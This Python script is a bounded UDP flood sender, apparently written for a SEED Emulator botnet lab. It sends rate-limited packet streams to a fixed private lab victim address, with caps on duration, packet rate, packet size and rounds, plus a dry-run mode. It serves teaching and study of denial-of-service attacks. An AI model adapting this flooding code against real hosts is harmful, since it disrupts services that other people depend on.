#!/usr/bin/env python3
"""Bounded UDP sender for the Y13 SEED Emulator botnet lab."""

from __future__ import annotations

import argparse
import json
import os
import socket
import time


VICTIM_IP = "10.151.0.71"
VICTIM_PORT = 9000
MAX_DURATION = 60.0
MAX_PACKETS_PER_SECOND = 2000
MAX_PACKET_SIZE = 1400
MAX_ROUNDS = 20
MAX_ROUND_INTERVAL = 60.0


def bounded(value: float, minimum: float, maximum: float, name: str) -> float:
    if not minimum <= value <= maximum:
        raise argparse.ArgumentTypeError(
            f"{name} must be between {minimum:g} and {maximum:g}"
        )
    return value


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Send a rate-limited UDP stream to the fixed Y13 lab victim."
    )
    parser.add_argument(
        "--duration",
        type=lambda value: bounded(float(value), 0.1, MAX_DURATION, "duration"),
        default=10.0,
        help=f"seconds per round (maximum {MAX_DURATION:g})",
    )
    parser.add_argument(
        "--pps",
        type=lambda value: int(bounded(float(value), 1, MAX_PACKETS_PER_SECOND, "pps")),
        default=200,
        help=f"packets per second (maximum {MAX_PACKETS_PER_SECOND})",
    )
    parser.add_argument(
        "--packet-size",
        type=lambda value: int(bounded(float(value), 32, MAX_PACKET_SIZE, "packet size")),
        default=1200,
        help=f"UDP payload bytes (maximum {MAX_PACKET_SIZE})",
    )
    parser.add_argument(
        "--rounds",
        type=lambda value: int(bounded(float(value), 1, MAX_ROUNDS, "rounds")),
        default=1,
    )
    parser.add_argument(
        "--interval",
        type=lambda value: bounded(float(value), 0, MAX_ROUND_INTERVAL, "interval"),
        default=2.0,
        help="seconds between rounds",
    )
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--json", action="store_true")
    return parser.parse_args()


def make_payload(size: int) -> bytes:
    identity = f"Y13:{socket.gethostname()}:{os.getpid()}:".encode("ascii", "replace")
    return (identity + b"X" * size)[:size]


def run_round(sock: socket.socket, payload: bytes, duration: float, pps: int) -> int:
    deadline = time.monotonic() + duration
    next_send = time.monotonic()
    period = 1.0 / pps
    sent = 0

    while time.monotonic() < deadline:
        sock.sendto(payload, (VICTIM_IP, VICTIM_PORT))
        sent += 1
        next_send += period
        delay = next_send - time.monotonic()
        if delay > 0:
            time.sleep(delay)
        elif delay < -1.0:
            next_send = time.monotonic()
    return sent


def main() -> int:
    args = parse_args()
    configuration = {
        "target": f"{VICTIM_IP}:{VICTIM_PORT}",
        "duration_seconds": args.duration,
        "packets_per_second": args.pps,
        "udp_payload_bytes": args.packet_size,
        "rounds": args.rounds,
        "round_interval_seconds": args.interval,
        "dry_run": args.dry_run,
    }
    if args.dry_run:
        print(json.dumps(configuration) if args.json else configuration, flush=True)
        return 0

    payload = make_payload(args.packet_size)
    total_sent = 0
    started = time.monotonic()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        for round_number in range(1, args.rounds + 1):
            print(
                f"round {round_number}/{args.rounds}: sending to "
                f"{VICTIM_IP}:{VICTIM_PORT} at {args.pps} pps for {args.duration:g}s",
                flush=True,
            )
            sent = run_round(sock, payload, args.duration, args.pps)
            total_sent += sent
            print(f"round {round_number}/{args.rounds}: sent {sent} packets", flush=True)
            if round_number < args.rounds and args.interval:
                time.sleep(args.interval)

    summary = {
        **configuration,
        "packets_sent": total_sent,
        "payload_bytes_sent": total_sent * len(payload),
        "elapsed_seconds": round(time.monotonic() - started, 3),
    }
    if args.json:
        print(json.dumps(summary), flush=True)
    else:
        print(
            "complete: sent {packets_sent} packets ({payload_bytes_sent} payload bytes) "
            "in {elapsed_seconds:.3f}s".format(**summary),
            flush=True,
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
